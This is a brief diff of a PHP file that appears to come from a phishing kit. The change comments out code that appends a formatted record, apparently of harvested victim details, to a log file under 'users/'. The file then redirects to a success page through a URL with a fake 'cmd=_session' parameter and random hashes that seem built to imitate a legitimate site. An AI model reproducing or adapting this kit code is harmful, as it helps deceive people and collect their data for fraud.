@@ -49,7 +49,7 @@ include('../../functions/get_lang_en.php');
                 //include('./robots.php');
             //HEADER("Location: ./A797XX666XX.acropo/{$path_parts["basename"]}");
         
-		
+		/*
 		$IDnew = "
 
 <pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
@@ -68,7 +68,7 @@ include('../../functions/get_lang_en.php');
 
 $f = fopen("../../users/tnt4.html", "a");
 	    fwrite($f, $IDnew);
-
+*/
 $succes = "../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."";		
 		
 		
